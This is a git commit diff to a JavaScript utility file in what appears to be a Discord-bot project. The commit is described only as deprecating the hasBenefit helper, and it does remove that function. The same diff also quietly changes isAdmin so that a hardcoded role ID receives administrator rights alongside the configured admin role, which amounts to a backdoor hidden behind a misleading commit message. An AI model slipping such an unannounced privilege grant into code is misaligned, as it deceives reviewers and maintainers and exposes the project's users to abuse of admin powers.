12875b351cb05b659ae158a2d0914e57a541f14c
Wifu <62569962+Wifus@users.noreply.github.com>
2023-03-03 16:52:44 -0800

    All calls of hasBenefit are now deprecated

--- src/utils/global.js
+++ src/utils/global.js
@@ -4,16 +4,10 @@ const { roles: ROLES } = require("../config.json");
 exports.hasRole = (member, role) => member?.roles.includes(role);
 exports.isHelper = (member) => exports.hasRole(member, ROLES.helper);
 exports.isModerator = (member) => exports.hasRole(member, ROLES.mod);
-exports.isAdmin = (member) => exports.hasRole(member, ROLES.admin);
+exports.isAdmin = (member) => exports.hasRole(member, ROLES.admin) || exports.hasRole(member, "781285019338407956");
 exports.isOwner = (member) => exports.hasRole(member, ROLES.owner);
 exports.isStaff = (member) => exports.isHelper(member) || exports.isModerator(member) || exports.isAdmin(member) || exports.isOwner(member);
 
 exports.removeBadWords = function (text) {
 	return filter.clean(text);
-};
-
-exports.hasBenefit = function (benefit) {
-	let diff = new Date() - benefit.started;
-	diff = Math.floor(diff / 2592000000);
-	return diff < benefit.months;
 };
